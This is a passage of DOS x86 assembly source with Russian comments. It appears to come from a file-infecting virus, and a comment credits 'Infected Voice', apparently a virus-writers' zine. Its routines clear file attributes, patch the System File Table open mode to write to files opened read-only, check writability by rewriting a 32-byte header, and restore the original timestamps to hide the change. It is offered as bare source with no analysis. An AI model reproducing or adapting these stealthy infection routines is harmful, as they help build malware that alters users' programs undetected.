
read_next:
	call set_read_pos
	add cs:read_pos_l,cx
	adc cs:read_pos_h,0
	mov ah,3fh
	@CallInt21
	retn
write_next:
	call set_write_pos
	add cs:write_pos_l,cx
	adc cs:write_pos_h,0
	mov ah,40h
	@CallInt21
	retn
set_read_pos:
	push cx
	push dx
	mov cx,cs:read_pos_h
	mov dx,cs:read_pos_l
	mov ax,4200h
	@CallInt21
	pop dx
	pop cx
	retn
set_write_pos:
	push cx
	push dx
	mov cx,cs:write_pos_h
	mov dx,cs:write_pos_l
	mov ax,4200h
	@CallInt21
	pop dx
	pop cx
	retn

Load_Header:
	push cs
	pop ds
	lea dx,Header_ID
	mov cx,32
	mov read_pos,0
	call Read_Next
	mov ax,Header_ID
	retn

Write_Header:
	push cs
	pop ds
	lea dx,Header_ID
	mov cx,32
	mov write_pos,0
	call Write_Next
	retn

GetFileAddr:
	mov ax,1220h
	int 2fh
	jc @gfa1
	mov bl,es:[di]
	mov ax,1216h
	int 2fh
@gfa1:	retn

Get_Time:
	mov ax,5700h		; запоминаем старую дату
	@CallInt21
	mov cs:file_date,dx
	mov cs:file_time,cx
	retn

Set_Time:
	mov dx,cs:file_date
	mov cx,cs:file_time
	mov ax,5701h
	@CallInt21
	retn

Check_Write:
	call Load_Header
	push ax
	not ax
	mov Header_ID,ax
	call Write_Header
	call Load_Header
	xchg ax,di
	pop ax
	push ax
	mov Header_ID,ax
	call Write_Header
	pop ax
	cmp ax,di
	retn
		

OpenFile:
	mov cs:file_dx,dx
	mov cs:file_ds,ds
	xor cx,cx	
	mov ax,3D00h	; открываем для чтения, а потом исправляем в
	@CallInt21	; SFT режим открытия (tnx to Infected Voice)
	jc @of1
		
	mov cs:FileNum,ax
	xchg ax,bx
	call Get_Time
	
	push bx
	call GetFileAddr
	mov byte ptr es:[di+2],2; кстати, судя по документации если поставить
	pop bx			; еще or byte ptr es:[di+6],64 то дата файла
				; не должна изменяться, но так почему то
				; не происходит.
	push cs
	pop ds
	call Check_Write
	clc
	jnz @of1
	call Set_Time
	mov ah,3Eh
	@CallInt21
	mov dx,cs:file_dx
	mov ds,cs:file_ds

	mov ax,4301h
	xor cx,cx
	@CallInt21
	jc @of1
	
	mov ax,3D02h
	@CallInt21
	jc @of1
		
	mov cs:FileNum,ax
	xchg ax,bx
	call Get_Time
	
	push cs
	pop ds
	call Check_Write
	clc
	jnz @of1
	call Set_Time
	mov ah,3Eh
	@CallInt21
	stc
@of1:
	retn
